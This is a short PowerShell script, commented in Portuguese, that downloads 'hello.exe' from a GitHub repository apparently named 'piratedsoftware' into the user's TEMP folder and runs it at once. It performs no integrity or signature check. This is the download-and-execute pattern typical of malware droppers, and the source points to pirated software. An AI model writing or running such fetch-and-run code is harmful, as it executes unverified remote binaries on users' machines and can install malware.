# Local onde o arquivo será salvo temporariamente
# $tempFile = "C:\Users\admin\Desktop\setup.exe"
# Start-Process -FilePath $tempFile -Wait

# URL do arquivo .exe a ser baixado
$url = "https://github.com/piratedsoftware/program1/blob/main/hello.exe"

# Local onde o arquivo será salvo temporariamente
$tempFile = "$env:TEMP\hello.exe"

# Baixar o arquivo .exe
Invoke-WebRequest -Uri $url -OutFile $tempFile

# Verificar se o download foi bem-sucedido
if (Test-Path $tempFile) {
    # Executar o arquivo .exe
    Start-Process -FilePath $tempFile -Wait
} else {
    Write-Host "Falha ao baixar o arquivo."
}
